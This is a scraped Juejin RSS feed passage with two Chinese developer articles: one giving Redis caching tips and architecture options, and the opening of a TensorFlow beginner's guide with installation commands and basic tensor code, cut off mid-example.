<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>掘金文章推荐</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>一个帮助开发者成长的社区</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[数据库压力大？Redis缓存这5个技巧让系统快10倍]]></title>    <link>https://juejin.cn/post/7602447286606364681</link>    <guid>https://juejin.cn/post/7602447286606364681</guid>    <pubDate>2026-02-03T07:07:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602447286606364681" data-draft-id="7602243150158561307" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="数据库压力大？Redis缓存这5个技巧让系统快10倍"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-02-03T07:07:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Java编程爱好者"/> <meta itemprop="url" content="https://juejin.cn/user/819554264300154"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            数据库压力大？Redis缓存这5个技巧让系统快10倍
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/819554264300154/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Java编程爱好者
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T07:07:30.000Z" title="Tue Feb 03 2026 07:07:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">你是否遇到过这样的情况：系统上线后运行良好，但随着用户量增长，数据库压力越来越大，查询越来越慢？别担心，今天我们就来学习<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269843081%26content_type%3DArticle%26match_order%3D1%26q%3DRedis%25E7%25BC%2593%25E5%25AD%2598%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269843081&amp;content_type=Article&amp;match_order=1&amp;q=Redis%E7%BC%93%E5%AD%98&amp;zhida_source=entity" ref="nofollow noopener noreferrer">Redis缓存</a>的使用技巧，让你的系统性能提升10倍！</h2>
<h2 data-id="heading-1">一个真实的性能危机故事</h2>
<p>小张是一名Java程序员，他开发了一个电商系统，上线初期运行良好。但随着用户量增长到10万，数据库开始出现性能瓶颈：</p>
<ul>
<li>查询商品详情需要2秒</li>
<li>数据库CPU使用率经常达到100%</li>
<li>高峰期甚至出现数据库连接超时</li>
</ul>
<p>小张尝试了各种优化方法都没有效果，直到他学习了Redis缓存的知识，才发现问题的根源——没有使用缓存减轻数据库压力。</p>
<h2 data-id="heading-2">Redis缓存的核心概念</h2>
<h3 data-id="heading-3">什么是缓存</h3>
<p>缓存是一种空间换时间的技术，将频繁访问的数据存储在高速存储介质中，减少对慢速存储介质（如数据库）的访问。</p>
<h3 data-id="heading-4">Redis为什么适合做缓存</h3>
<ul>
<li>高性能：Redis是基于内存的数据库，读写速度极快（10万+ QPS）</li>
<li>丰富的数据类型：支持String、Hash、List、Set、ZSet等多种数据类型</li>
<li>持久化：支持RDB和AOF两种持久化方式</li>
<li>分布式：支持主从复制和集群部署</li>
<li>原子操作：支持事务和Lua脚本</li>
</ul>
<h3 data-id="heading-5">缓存的工作流程</h3>
<ol>
<li>查询缓存：先从缓存中查询数据</li>
<li>缓存命中：如果缓存中有数据，直接返回</li>
<li>缓存未命中：从数据库查询数据，然后写入缓存</li>
<li>返回结果：将数据返回给用户</li>
</ol>
<h2 data-id="heading-6">Redis数据类型的正确使用</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9ac85538d526462696eb6d65b76aefff~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770707250&amp;x-signature=kJ20LrEfiTJQoH44uvvN38ieZUo%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-7">String类型</h3>
<p>适合存储简单的键值对，如商品详情、用户信息等。</p>
<h3 data-id="heading-8">Hash类型</h3>
<p>适合存储对象，如用户信息、订单详情等。</p>
<h3 data-id="heading-9">ZSet类型</h3>
<p>适合存储排行榜、时间线等有序数据。</p>
<h2 data-id="heading-10">Redis缓存的5个实战技巧</h2>
<h3 data-id="heading-11">1. 设置合理的过期时间</h3>
<p>错误示例：没有设置过期时间，可能导致缓存膨胀。</p>
<p>正确示例：设置1小时过期时间，避免缓存数据一直占用内存。</p>
<h3 data-id="heading-12">2. 使用缓存预热</h3>
<p>缓存预热是指在系统启动时，主动将热点数据加载到缓存中，避免用户请求直接打到数据库。</p>
<h3 data-id="heading-13">3. 解决缓存穿透问题</h3>
<p>缓存穿透是指查询不存在的数据，导致请求直接打到数据库。</p>
<p>解决方案：</p>
<ul>
<li>使用<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269843081%26content_type%3DArticle%26match_order%3D1%26q%3D%25E5%25B8%2583%25E9%259A%2586%25E8%25BF%2587%25E6%25BB%25A4%25E5%2599%25A8%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269843081&amp;content_type=Article&amp;match_order=1&amp;q=%E5%B8%83%E9%9A%86%E8%BF%87%E6%BB%A4%E5%99%A8&amp;zhida_source=entity" ref="nofollow noopener noreferrer">布隆过滤器</a>过滤不存在的请求</li>
<li>缓存空值（设置较短的过期时间）</li>
</ul>
<h3 data-id="heading-14">4. 解决缓存击穿问题</h3>
<p>缓存击穿是指热点key过期时，大量请求同时打到数据库。</p>
<p>解决方案：</p>
<ul>
<li>使用<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269843081%26content_type%3DArticle%26match_order%3D1%26q%3D%25E4%25BA%2592%25E6%2596%25A5%25E9%2594%2581%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269843081&amp;content_type=Article&amp;match_order=1&amp;q=%E4%BA%92%E6%96%A5%E9%94%81&amp;zhida_source=entity" ref="nofollow noopener noreferrer">互斥锁</a>（如Redis的SETNX）</li>
<li>设置热点key永不过期（定期更新）</li>
</ul>
<h3 data-id="heading-15">5. 解决缓存雪崩问题</h3>
<p>缓存雪崩是指大量缓存同时过期，导致请求直接打到数据库。</p>
<p>解决方案：</p>
<ul>
<li>设置随机过期时间</li>
<li>使用多级缓存</li>
<li>服务降级</li>
</ul>
<h2 data-id="heading-16">Redis缓存架构设计</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9e6defa0ce994d639aa0298219a45943~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770707250&amp;x-signature=InLJo4cRrbGEBVcUnHopLdYzemU%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-17">单机缓存</h3>
<p>适合小型应用，部署简单，但存在单点故障风险。</p>
<h3 data-id="heading-18">主从复制</h3>
<ul>
<li>主节点负责写操作</li>
<li>从节点负责读操作</li>
<li>提高系统的读性能和可用性</li>
</ul>
<h3 data-id="heading-19"><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269843081%26content_type%3DArticle%26match_order%3D1%26q%3D%25E5%2593%25A8%25E5%2585%25B5%25E6%25A8%25A1%25E5%25BC%258F%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269843081&amp;content_type=Article&amp;match_order=1&amp;q=%E5%93%A8%E5%85%B5%E6%A8%A1%E5%BC%8F&amp;zhida_source=entity" ref="nofollow noopener noreferrer">哨兵模式</a></h3>
<ul>
<li>监控主从节点的状态</li>
<li>主节点故障时自动切换到从节点</li>
<li>提高系统的可用性</li>
</ul>
<h3 data-id="heading-20"><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269843081%26content_type%3DArticle%26match_order%3D1%26q%3D%25E9%259B%2586%25E7%25BE%25A4%25E6%25A8%25A1%25E5%25BC%258F%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269843081&amp;content_type=Article&amp;match_order=1&amp;q=%E9%9B%86%E7%BE%A4%E6%A8%A1%E5%BC%8F&amp;zhida_source=entity" ref="nofollow noopener noreferrer">集群模式</a></h3>
<ul>
<li>将数据分片存储在多个节点</li>
<li>支持水平扩展</li>
<li>适合大规模应用</li>
</ul>
<h2 data-id="heading-21">总结</h2>
<p>Redis缓存并不复杂，只要掌握以下5个技巧：</p>
<ol>
<li>设置合理的过期时间：避免缓存膨胀</li>
<li>使用缓存预热：提前加载热点数据</li>
<li>解决缓存穿透：使用布隆过滤器或缓存空值</li>
<li>解决缓存击穿：使用互斥锁或设置热点key永不过期</li>
<li>解决缓存雪崩：设置随机过期时间或使用多级缓存</li>
</ol>
<p>行动建议：今天就检查你的项目，找出最频繁访问的10个接口，为它们添加Redis缓存，你会看到意想不到的性能提升！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[TensorFlow 入门指南]]></title>    <link>https://juejin.cn/post/7602252722373869619</link>    <guid>https://juejin.cn/post/7602252722373869619</guid>    <pubDate>2026-02-03T06:32:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602252722373869619" data-draft-id="7602201748230176787" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="TensorFlow 入门指南"/> <meta itemprop="keywords" content="后端,Python,TensorFlow"/> <meta itemprop="datePublished" content="2026-02-03T06:32:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="小小张说故事"/> <meta itemprop="url" content="https://juejin.cn/user/741501567509111"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            TensorFlow 入门指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/741501567509111/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    小小张说故事
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T06:32:50.000Z" title="Tue Feb 03 2026 06:32:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. 库的概览与核心价值</h2>
<p>想象一下,在构建智能应用时,如果缺少一个能高效处理复杂数学计算的框架,就像试图用算盘来计算卫星轨道一样举步维艰。<code>TensorFlow</code> 正是为解决大规模机器学习与深度学习计算而生的问题而生的工具。</p>
<p><code>TensorFlow</code> 是由 Google Brain 团队开发的开源机器学习平台,它通过灵活的数据流图机制,让开发者能够轻松构建、训练和部署各种机器学习模型。在 Python 生态中,TensorFlow 占据着不可替代的地位——它不仅支持从简单的线性回归到复杂的深度神经网络的各类模型,还能在 CPU、GPU、TPU 等多种硬件上高效运行,甚至可以部署到移动设备和浏览器端。</p>
<p>其核心价值体现在三个方面:首先,它提供了从研究到生产的完整工具链,包括数据处理、模型构建、训练优化到部署上线的全流程支持;其次,<code>tf.keras</code> 高级 API 让初学者能够快速上手,而底层 API 则为高级研究者提供了充分的定制空间;最后,强大的生态系统(如 TensorBoard 可视化、TensorFlow Lite 移动端部署、TensorFlow Serving 生产服务)使其成为企业级 AI 应用的首选平台。</p>
<h2 data-id="heading-1">2. 环境搭建与 "Hello, World"</h2>
<h3 data-id="heading-2">安装说明</h3>
<p>在开始使用 TensorFlow 之前,需要先配置 Python 环境。TensorFlow 支持 Python 3.7 及以上版本,推荐使用虚拟环境来隔离项目依赖。</p>
<p><strong>使用 pip 安装(推荐)</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 升级 pip</span>
pip install --upgrade pip

<span class="hljs-comment"># 安装 CPU 版本(适合学习和调试)</span>
pip install tensorflow

<span class="hljs-comment"># 安装 GPU 版本(需要 NVIDIA 显卡和 CUDA 支持)</span>
pip install tensorflow[and-cuda]
</code></pre>
<p><strong>使用 conda 安装</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 创建虚拟环境</span>
conda create -n tf_env python=3.9
conda activate tf_env

<span class="hljs-comment"># 安装 TensorFlow</span>
conda install tensorflow
</code></pre>
<p><strong>常见安装问题</strong></p>
<ul>
<li>如果安装速度慢,可以使用国内镜像源:
<pre><code class="hljs language-bash" lang="bash">pip install tensorflow -i https://pypi.tuna.tsinghua.edu.cn/simple
</code></pre>
</li>
<li>GPU 版本需要提前安装对应版本的 CUDA 和 cuDNN,请查阅官方文档的版本对应表</li>
</ul>
<h3 data-id="heading-3">最简示例</h3>
<p>下面是一个简单的 TensorFlow 程序,它演示了张量的创建和基本运算:</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> tensorflow <span class="hljs-keyword">as</span> tf

<span class="hljs-comment"># 创建两个常量张量</span>
a = tf.constant(<span class="hljs-number">2.0</span>)
b = tf.constant(<span class="hljs-number">3.0</span>)

<span class="hljs-comment"># 执行加法运算</span>
result = tf.add(a, b)

<span class="hljs-comment"># 打印结果</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"a = <span class="hljs-subst">{a}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"b = <span class="hljs-subst">{b}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"a + b = <span class="hljs-subst">{result}</span>"</span>)
</code></pre>
<p><strong>逐行解释</strong></p>
<ul>
<li><code>import tensorflow as tf</code>: 导入 TensorFlow 库,并使用别名 <code>tf</code>,这是 TensorFlow 编程的惯例</li>
<li><code>a = tf.constant(2.0)</code>: 创建一个值为 2.0 的常量张量。张量是 TensorFlow 中最基本的数据结构,类似于 NumPy 数组,但可以在 GPU 上运行</li>
<li><code>b = tf.constant(3.0)</code>: 创建另一个常量张量,值为 3.0</li>
<li><code>result = tf.add(a, b)</code>: 执行张量加法运算。TensorFlow 提供了丰富的数学运算函数</li>
<li><code>print(f"a + b = {result}")</code>: 使用 f-string 格式化输出结果。在 TensorFlow 2.x 的 Eager Execution 模式下,张量的值可以直接打印</li>
</ul>
<p><strong>预期输出</strong></p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">a</span> = <span class="hljs-number">2.0</span>
<span class="hljs-attr">b</span> = <span class="hljs-number">3.0</span>
a + <span class="hljs-attr">b</span> = <span class="hljs-number">5.0</span>
</code></pre>
<h2 data-id="heading-4">3. 核心概念解析</h2>
<p>TensorFlow 的核心概念围绕张量和计算展开,理解这些概念是掌握 TensorFlow 的基础。</p>
<h3 data-id="heading-5">张量</h3>
<p>张量是 TensorFlow 中最基本的数据结构,可以将其理解为多维数组。标量(0 阶张量)、向量(1 阶张量)、矩阵(2 阶张量)以及更高维度的数组都是张量的特例。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 创建不同类型的张量</span>
scalar = tf.constant(<span class="hljs-number">42</span>)           <span class="hljs-comment"># 标量</span>
vector = tf.constant([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>])   <span class="hljs-comment"># 向量</span>
matrix = tf.constant([[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>], [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>]])  <span class="hljs-comment"># 矩阵</span>

<span class="hljs-built_in">print</span>(scalar.shape)   <span class="hljs-comment"># 输出: ()</span>
<span class="hljs-built_in">print</span>(vector.shape)   <span class="hljs-comment"># 输出: (3,)</span>
<span class="hljs-built_in">print</span>(matrix.shape)   <span class="hljs-comment"># 输出: (2, 2)</span>
</code></pre>
<p>张量的两个重要属性是 <code>shape</code>(形状)和 <code>dtype</code>(数据类型)。形状描述了张量的维度,而数据类型则定义了张量中元素的类型,如 <code>tf.float32</code>、<code>tf.int32</code> 等。</p>
<h3 data-id="heading-6">变量</h3>
<p>变量是一种特殊的张量,用于存储模型的可训练参数(如神经网络的权重和偏置)。与普通张量不同,变量的值在训练过程中会被更新。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 创建一个变量</span>
weights = tf.Variable(tf.random.normal([<span class="hljs-number">2</span>, <span class="hljs-number">3</span>]))

<span class="hljs-comment"># 访问和修改变量的值</span>
<span class="hljs-built_in">print</span>(weights)
weights.assign(tf.ones([<span class="hljs-number">2</span>, <span class="hljs-number">3</span>]))  <span class="hljs-comment"># 修改变量的值</span>
</code></pre>
<h3 data-id="heading-7">Eager Execution</h3>
<p>TensorFlow 2.x 默认启用 Eager Execution(即时执行模式),这意味着操作会立即执行并返回结果,就像普通的 Python 代码一样。这与 TensorFlow 1.x 的静态图模式(先定义计算图,再通过 Session 执行)形成鲜明对比。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 在 Eager Execution 模式下,操作立即执行</span>
x = tf.constant([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>])
y = tf.constant([<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>])
<span class="hljs-built_in">print</span>(x + y)  <span class="hljs-comment"># 立即输出结果</span>
</code></pre>
<h3 data-id="heading-8">计算图与 tf.function</h3>
<p>虽然 Eager Execution 便于调试,但对于大型模型,其性能不如静态图。<code>tf.function</code> 装饰器可以将 Python 函数编译成高效的计算图,实现性能优化。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-meta">@tf.function</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">compute</span>(<span class="hljs-params">x</span>):
    <span class="hljs-keyword">return</span> x * x + <span class="hljs-number">2</span>

<span class="hljs-comment"># 首次调用时会构建计算图</span>
result = compute(tf.constant(<span class="hljs-number">5.0</span>))
